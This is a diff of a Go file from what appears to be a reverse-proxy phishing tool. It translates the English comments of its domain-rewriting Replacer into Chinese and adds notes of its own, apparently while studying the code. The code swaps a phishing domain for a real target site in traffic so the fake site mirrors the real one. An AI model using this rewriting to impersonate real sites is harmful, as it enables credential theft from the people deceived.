@@ -24,13 +24,13 @@ const (
 	WildcardPrefix = "wld"
 )
 
-// Replacer structure used to populate the transformation rules
+// Replacer 结构被用于填充转换规则
 type Replacer struct {
 	Phishing                      string
 	Target                        string
 	ExternalOrigin                []string
 	ExternalOriginPrefix          string
-	OriginsMapping                map[string]string // The origin map who maps between external origins and internal origins
+	OriginsMapping                map[string]string // 外部源与内部源之间的映射
 	WildcardMapping               map[string]string
 	CustomResponseTransformations [][]string
 	ForwardReplacements           []string
@@ -48,16 +48,12 @@ type Base64 struct {
 }
 
 // Transform
-// If used with forward=true, Transform uses Replacer to replace all occurrences of the phishing origin, the external domains defined,
-// as well as the rest of the data to be replaced defined in MakeReplacements(), with the target real origin.
-// If used with forward=false, Transform will replace data coming from the targeted origin
-// with the real proxied origin (target).
-// Forward:
-// - true > change requests, i.e.  phishing > target origin
-// - false > change response, i.e. target origin > phishing
+// 如果与 forward=true 一起使用，Transform 使用 Replacer 将所有出现的网络钓鱼源、定义的外部域以及 MakeReplacements() 中定义的要替换的其余数据替换为目标真实源
+// forward=true -> 更改请求
+// 如果与 forward=false 一起使用，Transform 将用真实的代理源（目标）替换来自目标源的数据
+// forward=false -> 更改响应
 // Base64:
-// Since some request parameter values can be base64 encoded, we need to decode first,
-// apply the transformation and re-encode (hello ReCaptcha)
+// 由于某些请求参数值可以进行 base64 编码，因此我们需要先解码，应用转换并重新编码
 func (r *Replacer) Transform(input string, forward bool, b64 Base64) (result string) {
 
 	original := input
@@ -67,7 +63,7 @@ func (r *Replacer) Transform(input string, forward bool, b64 Base64) (result str
 
 	var replacements []string
 	var lastReplacements []string
-	if forward { // used in Requests
+	if forward {
 		replacements = r.ForwardReplacements
 		lastReplacements = r.LastForwardReplacements
 	} else { // used in Responses
@@ -75,42 +71,44 @@ func (r *Replacer) Transform(input string, forward bool, b64 Base64) (result str
 		lastReplacements = r.LastBackwardReplacements
 	}
 
-	// Handling of base64 encoded data which should be decoded before transformation
+	// 处理在转换之前应解码的 Base64 编码数据
 	input, base64Found, padding := transformBase64(input, b64, true, Base64Padding)
 
-	// Replace transformation
+	// Replace 转换
 	replacer := strings.NewReplacer(replacements...)
 	result = replacer.Replace(input)
 
-	// do last replacements
+	// 进行最后的替换
 	replacer = strings.NewReplacer(lastReplacements...)
 	result = replacer.Replace(result)
 
-	// Re-encode if base64 encoded data was found
+	// 如果找到 Base64 编码数据，则重新编码
 	if base64Found {
 		result, _, _ = transformBase64(result, b64, false, padding)
 	}
 
 	if original != result {
-
-		// Find wildcard matching
+		// 处理前后不一致
+		// 查找通配符匹配
 		if Wildcards {
 			var rep []string
 
 			wldPrefix := fmt.Sprintf("%s%s", r.ExternalOriginPrefix, WildcardPrefix)
-
+			// result 中是否有通配符
 			if strings.Contains(result, "."+wldPrefix) {
 
-				// URL encoding handling
+				// URL 编码处理
 				urlEncoded := false
 				decodedValue, err := url.QueryUnescape(result)
+				// URL 解码
 				if err == nil && result != decodedValue {
 					urlEncoded = true
 					result = decodedValue
 				}
-
+				// 对 r.Phishing 中的特殊字符进行转义
 				domain := regexp.QuoteMeta(r.Phishing)
 				re := regexp.MustCompile(fmt.Sprintf(`[a-zA-Z0-9.-]+%s\d+.%s`, WildcardPrefix, domain))
+				// 找 result 中是否有 r.Phishing
 				matchSubdomains := re.FindAllString(result, -1)
 				matchSubdomains = ArmorDomain(matchSubdomains)
 				if len(matchSubdomains) > 0 {
@@ -256,21 +254,20 @@ func (r *Replacer) patchWildcard(rep []string) (prep []string) {
 	return prep
 }
 
-// MakeReplacements prepares the forward and backward replacements to be used in the proxy
+// MakeReplacements 准备在 proxy 中使用的前向与后向替换
 func (r *Replacer) MakeReplacements() {
 
-	//
-	// Requests
-	//
+	// r.ForwardReplacements = [r.Phishing, r.Target]
 	r.ForwardReplacements = []string{}
 	r.ForwardReplacements = append(r.ForwardReplacements, []string{r.Phishing, r.Target}...)
 
 	log.Debug("[Forward | origins]: %d", len(r.OriginsMapping))
 	count := len(r.ForwardReplacements)
+	// extOrigin 为外部源，subMapping 为内部源
 	for extOrigin, subMapping := range r.OriginsMapping { // changes resource-1.phishing.
-
+		// subMapping 是否以 "wld" 为前缀
 		if strings.HasPrefix(subMapping, WildcardPrefix) {
-			// Ignoring wildcard at this stage
+			// 忽略通配符
 			log.Debug("[Wildcard] %s - %s", tui.Yellow(subMapping), tui.Green(extOrigin))
 			continue
 		}
@@ -278,13 +275,14 @@ func (r *Replacer) MakeReplacements() {
 		from := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
 		to := extOrigin
 		rep := []string{from, to}
+		// r.ForwardReplacements = [subMapping.Phishing, extOrigin]
 		r.ForwardReplacements = append(r.ForwardReplacements, rep...)
 
 		count++
 		log.Debug("[Forward | replacements #%d]: %s > %s", count, tui.Yellow(rep[0]), tui.Green(to))
 	}
 
-	// Append wildcards at the end
+	// 在最后添加 wildcards
 	for extOrigin, subMapping := range r.WildcardMapping {
 		from := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
 		to := extOrigin
@@ -295,17 +293,17 @@ func (r *Replacer) MakeReplacements() {
 		log.Debug("[Wild Forward | replacements #%d]: %s > %s", count, tui.Yellow(rep[0]), tui.Green(to))
 	}
 
-	//
-	// Responses
-	//
+	// r.BackwardReplacements = [r.Target, r.Phishing]
 	r.BackwardReplacements = []string{}
 	r.BackwardReplacements = append(r.BackwardReplacements, []string{r.Target, r.Phishing}...)
 
 	count = 0
+	// include 为外部源
+	// subMapping 为内部源
+	// 这与前面有什么区别呢？
 	for include, subMapping := range r.OriginsMapping {
 
 		if strings.HasPrefix(subMapping, WildcardPrefix) {
-			// Ignoring wildcard at this stage
 			log.Debug("[Wildcard] %s - %s", tui.Yellow(subMapping), tui.Green(include))
 			continue
 		}
@@ -319,7 +317,7 @@ func (r *Replacer) MakeReplacements() {
 		log.Debug("[Backward | replacements #%d]: %s < %s", count, tui.Green(rep[0]), tui.Yellow(to))
 	}
 
-	// Append wildcards at the end
+	// 最后添加通配符
 	for include, subMapping := range r.WildcardMapping {
 		from := include
 		to := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
@@ -330,11 +328,10 @@ func (r *Replacer) MakeReplacements() {
 		log.Debug("[Wild Backward | replacements #%d]: %s < %s", count, tui.Green(rep[0]), tui.Yellow(to))
 	}
 
-	//
-	// These should be done as Final replacements
+	// 最终替换
 	r.LastBackwardReplacements = []string{}
 
-	// Custom HTTP response replacements
+	// 常规 HTTP response 替换，添加到 r.BackwardReplacements 中
 	for _, tr := range r.CustomResponseTransformations {
 		r.LastBackwardReplacements = append(r.LastBackwardReplacements, tr...)
 		log.Debug("[Custom Replacements] %+v", tr)
@@ -349,7 +346,7 @@ func (r *Replacer) DomainMapping() (err error) {
 	// d := strings.Split(r.Target, ".")
 	//baseDom := fmt.Sprintf("%s.%s", d[len(d)-2], d[len(d)-1])
 
-	// Changing baseDom to be the actual Target domain.
+	// 将 baseDom 更改为实际的目标域
 	baseDom := r.Target
 	log.Debug("Proxy destination: %s", tui.Bold(tui.Green("*."+baseDom)))
 
@@ -360,9 +357,10 @@ func (r *Replacer) DomainMapping() (err error) {
 	count, wildcards := 0, 0
 	for _, domain := range r.ExternalOrigin {
 		if IsSubdomain(baseDom, domain) {
+			// domain 去除 baseDom 的后缀
 			trim := strings.TrimSuffix(domain, baseDom)
 
-			// We don't map 1-level subdomains ..
+			// 不映射一级子域名
 			if strings.Count(trim, ".") < 2 {
 				log.Debug("Ignore: %s [%s]", domain, trim)
 				continue
@@ -370,13 +368,12 @@ func (r *Replacer) DomainMapping() (err error) {
 		}
 
 		if isWildcard(domain) {
-			// Wildcard domains
 			wildcards++
 
-			// Fix domain by removing the prefix *.
+			// domain 去除通配符
 			domain = strings.TrimPrefix(domain, "*.")
 
-			// Update the wildcard map
+			// 更新通配符映射 domain -> ExternalOriginPrefix|"wld"|wildcards
 			prefix := fmt.Sprintf("%s%s", r.ExternalOriginPrefix, WildcardPrefix)
 			o := fmt.Sprintf("%s%d", prefix, wildcards)
 			r.WildcardDomain = o
@@ -386,8 +383,9 @@ func (r *Replacer) DomainMapping() (err error) {
 
 		} else {
 			count++
-			// Extra domains or nested subdomains
+			// 额外 domains 或嵌套子域
 			o := fmt.Sprintf("%s%d", r.ExternalOriginPrefix, count)
+			// domain -> ExternalOriginPrefix|count
 			r.OriginsMapping[domain] = o
 			//log.Info("Including [%s]=%s", domain, o)
 			log.Debug(fmt.Sprintf("Including [%s]=%s", domain, o))
